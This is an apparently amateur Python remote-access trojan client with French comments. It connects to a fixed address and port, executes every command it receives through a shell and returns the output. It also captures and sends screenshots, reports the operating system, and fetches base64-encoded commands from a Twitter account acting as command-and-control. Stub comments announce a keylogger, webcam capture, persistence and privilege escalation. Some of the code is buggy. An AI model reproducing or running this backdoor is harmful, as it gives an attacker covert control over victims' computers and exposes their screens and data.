##Droit d'auteur crée par MoonEyes 2020

import subprocess
import sys
import os
#os.popen("sudo /usr/bin/pip3 install --upgrade typing")
try:
    import mss
except ImportError:
    subprocess.check_call([sys.executable, '-m', 'pip3', 'install',
'mss'])
finally:
    import mss
try:
    import socket
except ImportError:
    subprocess.check_call([sys.executable, '-m', 'pip3', 'install',
'socket'])
finally:
    import socket as s
try:
    import requests
except ImportError:
    subprocess.check_call([sys.executable, '-m', 'pip3', 'install',
'requests'])
finally:
    import requests
try:
    import bs4
except ImportError:
    subprocess.check_call([sys.executable, '-m', 'pip3', 'install',
'bas4'])
finally:
    from bs4 import BeautifulSoup as soup
try:
    import base64
except ImportError:
    subprocess.check_call([sys.executable, '-m', 'pip3', 'install',
'base64'])
finally:
    import base64




message = str()
#### Client ######
##Attendre une connexion

def detectos():
    try:
        detectcmd = "lsb_release -a"
        resultDetectos = subprocess.Popen(detectcmd, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    except:
        pass
    try:
        dtectcmd = "systeminfo"
        resultDetectos = subprocess.Popen(detectcmd, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    except:
        pass
    return resultDetectos




def screen():
    with mss() as sct :
        sct.shot()
        f = open("monitor-1.png","rb")
        data=  f.read()
        f.close()
    return data

def candc():
    url = "http://twitter.com/S1mpleCC"
    data = requests.get(url)
    data2 = soup(data.text,"html.parser")
    cmd = data2.find("div", {"class":"tweet"}).find("div",{"class":"js-tweet-text-container"}).find("p").string
    payload = base64.b64decode(cmd)
    return payload

#écrire dans le profile pour persistant
#def persistant():
##def  Keylogger():
##def webcam():
##def pivoting():
##def dump():
##def video():
##def crypt():
##def nmap():
    ##download package and scan réseaux
##def popup():
##def popuptexte():
##def privilege():
##def logs():    



mon_socket = s.socket(s.AF_INET,s.SOCK_STREAM)


### Fonction connect((host,port)

mon_socket.connect(("192.168.1.196",1243))
while message != "exit":
    message = mon_socket.recv(262144)
    message = message.decode('UTF-8')

    if message == "os":
        detectosDef = detectos()
        mon_socket.send(detectosDef.stdout.read()+detectosDef.stderr.read())

    elif message == "screen":
        mon_socket.send(screen())
    elif message == "candc":
        payloadcmd = candc()
        process = subprocess.Popen(payloadcmd, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        mon_socket.send(process.stdout.read()+process.stderr.read())

    #if message = "persistant":
    else:
        #print(message)
        process = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        mon_socket.send(process.stdout.read()+process.stderr.read())


mon_socket.close()

#    if message == "exit":
#        mon_socket.close()
